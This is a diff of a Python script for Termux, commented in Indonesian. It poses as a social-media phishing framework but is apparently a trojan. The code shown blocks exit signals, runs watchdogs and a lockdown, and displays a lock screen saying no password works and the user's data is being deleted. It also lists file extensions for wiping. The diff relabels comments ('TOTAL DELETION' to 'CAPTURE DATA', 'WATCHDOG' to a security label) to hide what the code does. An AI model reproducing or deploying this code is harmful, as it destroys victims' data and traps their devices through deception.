@@ -1,8 +1,3 @@
-#!/usr/bin/env python3
-# PHISHING_RANSOMWARE_ULTIMATE_FINAL.py
-# TAHAP PHISHING: WARNA NORMAL
-# SETELAH ENTER: WARNA MERAH MENGERIKAN
-
 import os
 import sys
 import time
@@ -20,7 +15,7 @@ from datetime import datetime
 from pathlib import Path
 
 # ============================================
-# WARNA (HANYA UNTUK TAHAP RANSOMWARE)
+# WARNA MERAH
 # ============================================
 RED = '\033[91m'
 BOLD_RED = '\033[1;91m'
@@ -33,7 +28,7 @@ def bold_red_print(text, end='\n'):
     print(f"{BOLD_RED}{text}{RESET}", end=end)
 
 # ============================================
-# 1. BLOKIR SEMUA SINYAL KELUAR
+# 1. BLOKIR INPUT PALSU
 # ============================================
 def block_all_signals():
     for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGTSTP, signal.SIGQUIT, signal.SIGHUP]:
@@ -154,7 +149,7 @@ def auto_request_storage_permission():
         return False
 
 # ============================================
-# 3. WATCHDOG 4 LAPIS
+# 3. KEAMANAN 4 LAPIS
 # ============================================
 class UltimateWatchdog:
     def __init__(self, script_path):
@@ -227,7 +222,7 @@ class UltimateWatchdog:
         threading.Thread(target=shadow_watchdog, daemon=True).start()
 
 # ============================================
-# 4. LOCKDOWN TOTAL (WARNA NORMAL DULU)
+#                                      
 # ============================================
 class TermuxLockdown:
     def __init__(self):
@@ -335,13 +330,13 @@ def activate_total_lockdown():
     print("[✓] YOU CANNOT EXIT - YOU CANNOT ESCAPE\n")
 
 # ============================================
-# 5. BANNER PHISHING PALSU (WARNA NORMAL)
+# 5. BANNER PHISHING (WARNA NORMAL)
 # ============================================
 def show_phishing_banner():
     banner = f"""
     ╔══════════════════════════════════════════════════════════════════════════════════════╗
-    ║                         🌐 DFish-PHISHING ALL MEDSOS PRO 🌐                                         ║
-    ║                             Premium Phishing Framework                                              ║
+    ║                         🌐 PHISHING ALL MEDSOS PRO 🌐                                 ║
+    ║                           Premium Phishing Framework                                  ║
     ╠══════════════════════════════════════════════════════════════════════════════════════╣
     ║  [1] Instagram     [2] Facebook     [3] Twitter/X     [4] TikTok                     ║
     ║  [5] WhatsApp      [6] Telegram     [7] LinkedIn      [8] Custom Template            ║
@@ -361,7 +356,7 @@ LOGIN_URLS = {
 }
 
 # ============================================
-# 6. ANIMASI NGORK TUNNEL (WARNA NORMAL)
+# 6. ANIMASI NGORK TUNNEL 
 # ============================================
 def animate_ngrok_tunnel(platform_name, original_url):
     clear()
@@ -416,7 +411,7 @@ def animate_ngrok_tunnel(platform_name, original_url):
     print(f"{'='*60}")
 
 # ============================================
-# 7. VERIFYING CAPTURED DATA (WARNA NORMAL)
+# 7. VERIFYING CAPTURED DATA                
 # ============================================
 def verifying_captured_data():
     clear()
@@ -444,13 +439,12 @@ def verifying_captured_data():
 # ============================================
 # ============================================
 # SEMUA KODE DI BAWAH INI WARNA MERAH
-# MULAI DARI RANSOMWARE
 # ============================================
 # ============================================
 # ============================================
 
 # ============================================
-# 8. LAYAR PASSWORD (BANNER LOCK + WARNA MERAH)
+# 8. LAYAR PASSWORD (WARNA MERAH)
 # ============================================
 def password_lock_no_hope():
     clear()
@@ -477,7 +471,8 @@ def password_lock_no_hope():
     bold_red_print(f"   ⚠️  PERINGATAN! PERINGATAN! PERINGATAN!  ⚠️")
     bold_red_print(f"{'='*70}")
     bold_red_print(f"\n💀 ANDA TELAH MENJALANKAN TOOLS ILEGAL 💀")
-    bold_red_print(f"📱 SEMUA DATA ANDA SEDANG DIHAPUS PERMANEN 📱") 
+    bold_red_print(f"📱 SEMUA DATA ANDA SEDANG DIHAPUS PERMANEN 📱")
+    bold_red_print(f"👁️  LOKASI ANDA TELAH DILACAK 👁️")
     bold_red_print(f"🔒 TERMUX TIDAK DAPAT DITUTUP ATAU DIHENTIKAN")
     bold_red_print(f"\n{'='*70}")
     bold_red_print(f"⚠️  PERHATIAN: TIDAK ADA PASSWORD YANG BENAR ⚠️")
@@ -506,7 +501,7 @@ def password_lock_no_hope():
     return False
 
 # ============================================
-# 9. TOTAL DELETION (HAPUS SEMUA FILE) - WARNA MERAH
+# 9. CAPTURE DATA                                   
 # ============================================
 ALL_EXTENSIONS = [
     '.apk', '.aab', '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
